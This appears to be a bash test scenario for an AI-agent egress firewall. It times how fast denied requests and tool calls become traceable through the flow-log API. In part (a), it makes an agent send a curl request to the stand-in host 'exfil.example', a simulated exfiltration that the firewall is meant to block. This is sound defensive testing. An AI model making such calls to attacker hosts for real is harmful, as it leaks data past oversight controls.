#!/usr/bin/env bash
# 20 — Mesures du journal par l'API (cahier §8) :
#   a) « refus → flux ouvert » : délai entre le lancement d'une requête refusée et l'ouverture de son flux
#      (liste filtrée puis détail) par l'API, interrogée toutes les 100 ms ;
#   b) « retrouver un flux » : après un appel d'outil de daniel-bot, délai jusqu'à disposer par l'API de l'agent,
#      la conversation, l'action (outil), le contenu (corps) et la règle ; durée des appels d'API eux-mêmes.
# AFW_MEASURE_N (default 5) repetitions each; medians and maxima reported in demo/.state/results/measures.json.
# shellcheck source=demo/lib.sh
. "$(dirname "$0")/../lib.sh"
scenario_begin 20-mesures-journal "Mesures : refus → flux ouvert, et flux → agent/conversation/action/contenu/règle"
require_demo laurent-bot daniel-bot
n="${AFW_MEASURE_N:-5}"
median() { sort -n | awk '{a[NR]=$1} END {if (NR % 2) print a[(NR+1)/2]; else printf "%d", (a[NR/2]+a[NR/2+1])/2}'; }
maxv() { sort -n | tail -n1; }
lid="$(agent_id laurent-bot)"; did_="$(agent_id daniel-bot)"
deny_ms=""; find_ms=""; calls_ms=""
for i in $(seq 1 "$n"); do
  # a) denial -> flow opened
  since="$(now_iso)"; sleep 1; m="s20-$(rand_hex)"
  t0="$(now_ms)"
  agent_sh laurent-bot "curl -s -o /dev/null --max-time 5 https://exfil.example/$m" >/dev/null 2>&1 || true
  t_req="$(( $(now_ms) - t0 ))"; ok=0
  for _ in $(seq 1 300); do
    f="$(flows "agent=$lid&destination=exfil.example&verdict=deny&from=$since&limit=1" 2>/dev/null | head -n1 || true)"
    if [ -n "$f" ] && flow_detail "$(printf '%s' "$f" | jqx -r .id)" >/dev/null 2>&1; then ok=1; break; fi
    sleep 0.1
  done
  [ "$ok" = 1 ] || fail "run $i: denied flow not found within 30 s"
  d="$(( $(now_ms) - t0 ))"; deny_ms="$deny_ms $d"
  evidence "run $i: denial answered in ${t_req} ms; flow opened through the API ${d} ms after the request started"

  # b) tool call -> agent, conversation, action, content, rule
  conv="conv-s20-$(rand_hex 8)"; mb="s20b-$(rand_hex)"; since="$(now_iso)"
  req="$(jqx -nc --arg c "$conv" --arg m "$mb" '{tool: "fetch", conversation_id: $c, args: {url: "https://allowed.example/report", method: "POST", body: ("measure " + $m)}}')"
  dc exec -T daniel-bot curl -sS --max-time 30 -H 'content-type: application/json' -d "$req" "$DANIEL_RUN_URL" >/dev/null 2>&1 || fail "run $i: daniel-bot did not run the tool"
  t0="$(now_ms)"; ok=0
  for _ in $(seq 1 600); do
    t1="$(now_ms)"
    f="$(flows "agent=$did_&destination=allowed.example&from=$since&limit=5" 2>/dev/null | head -n1 || true)"
    if [ -n "$f" ]; then
      det="$(flow_detail "$(printf '%s' "$f" | jqx -r .id)" 2>/dev/null || true)"
      if printf '%s' "$det" | jqx -e --arg c "$conv" '.correlation.conversation_id == $c and .tool_call.tool != null and .flow.decision.rule_name != null and .flow.agent_id != null' >/dev/null 2>&1 &&
        printf '%s' "$det" | grep -q -- "$mb"; then
        c="$(( $(now_ms) - t1 ))"; ok=1; break
      fi
    fi
    sleep 0.1
  done
  [ "$ok" = 1 ] || fail "run $i: flow with agent/conversation/tool/content/rule not found within 60 s"
  d="$(( $(now_ms) - t0 ))"; find_ms="$find_ms $d"; calls_ms="$calls_ms $c"
  evidence "run $i: $conv — agent, conversation, tool $(printf '%s' "$det" | jqx -r .tool_call.tool), content and rule #$(printf '%s' "$det" | jqx -r .flow.decision.rule_number) available ${d} ms after the tool call (the 2 API calls: ${c} ms)"
done
dm="$(printf '%s\n' $deny_ms | median)"; dx="$(printf '%s\n' $deny_ms | maxv)"
fm="$(printf '%s\n' $find_ms | median)"; fx="$(printf '%s\n' $find_ms | maxv)"
cm="$(printf '%s\n' $calls_ms | median)"
evidence "MEDIAN denial -> flow opened: ${dm} ms (max ${dx} ms) over $n runs"
evidence "MEDIAN tool call -> agent/conversation/action/content/rule: ${fm} ms (max ${fx} ms); API calls themselves ${cm} ms"
jqx -n --argjson n "$n" --argjson dm "$dm" --argjson dx "$dx" --argjson fm "$fm" --argjson fx "$fx" --argjson cm "$cm" \
  '{runs: $n, denial_to_flow_opened_ms: {median: $dm, max: $dx}, tool_call_to_full_trace_ms: {median: $fm, max: $fx}, api_calls_ms: {median: $cm}}' \
  >"$RESULTS_DIR/measures.json"
[ "$fx" -lt 60000 ] || fail "a flow took ${fx} ms to be traced (>= 60 s)"
pass "refus → flux ouvert : médiane ${dm} ms ; flux → agent/conversation/action/contenu/règle : médiane ${fm} ms (max ${fx} ms)"
